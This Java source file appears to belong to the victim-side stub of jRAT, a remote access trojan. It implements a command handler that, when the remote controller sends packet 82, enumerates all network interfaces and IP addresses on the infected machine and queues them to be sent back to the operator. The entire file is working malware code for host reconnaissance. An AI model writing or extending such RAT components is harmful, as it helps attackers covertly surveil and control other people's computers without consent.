package se.jrat.stub.packets.incoming;

import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Enumeration;

import se.jrat.stub.Connection;
import se.jrat.stub.packets.outgoing.Packet56NetworkAdapter;


public class Packet82NetworkAdapters extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		Enumeration<NetworkInterface> nets = NetworkInterface.getNetworkInterfaces();
		for (NetworkInterface netint : Collections.list(nets)) {
			ArrayList<InetAddress> list = Collections.list(netint.getInetAddresses());

			Connection.instance.addToSendQueue(new Packet56NetworkAdapter(netint.getDisplayName(), netint.getName(), list));
		}
	}

}
